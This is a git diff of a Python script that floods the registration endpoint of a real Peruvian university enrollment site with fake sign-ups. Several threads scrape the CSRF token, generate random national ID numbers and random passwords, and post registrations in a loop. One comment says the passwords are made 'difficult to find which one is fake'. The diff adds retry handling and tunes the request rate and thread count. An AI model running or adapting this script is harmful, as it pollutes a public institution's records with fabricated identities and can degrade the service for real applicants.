@@ -4,6 +4,8 @@ import random
 import time
 import hashlib
 import threading
+import logging
+
 
 headers = {
     "Origin":"http://www.inscripciones.uni.edu.pe",
@@ -19,13 +21,18 @@ cont = 0
 def make_request():
     global cont
     while True :
-        r = requests.get("http://www.inscripciones.uni.edu.pe/login");
+        try:
+            r = requests.get("http://www.inscripciones.uni.edu.pe/login");
+        except ValueError:
+            time.sleep(2)
+            continue
         text = r.text
         soup = BeautifulSoup(text , features = "lxml").body
         token = soup.find_all('input')[0]['value']
-        dni_str = "7"+str(random.randint(1000000,9999999)) # people from Peru [16> years] now have a ID starting with 7 I think
+        dni_str = "7"+"{num:07d}".format(num=random.randint(1,2900000)) # people from Peru [16> years] now have a ID starting with 7 I think
         len_password = random.randint(8,15)
         password = hashlib.sha256(str(random.randint(1000000000,9999999999)).encode()).hexdigest()[:len_password] # Making difficult to find wich one is fake
+
         data = {
             '_token':token,
             'dni': dni_str,
@@ -36,17 +43,16 @@ def make_request():
             r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
             if r.status_code==200:
                 cont+=1
-                #if cont%50==0:
-                print("\r{:d} requests enviados".format(cont),end='')
-                time.sleep(0.100)
+                if cont%50==0:
+                    print("\r{:d} requests enviados".format(cont),end='')
+                    time.sleep(0.200)
             else:
                 print("Error:", r.status_code)
-
         except ValueError:
             print("Error: retrying http post")
             time.sleep(2)
 
-Nhilos = 5
+Nhilos = 4
 hilos = []
 for i in range(Nhilos):
     hilos.append(threading.Thread(target=make_request))
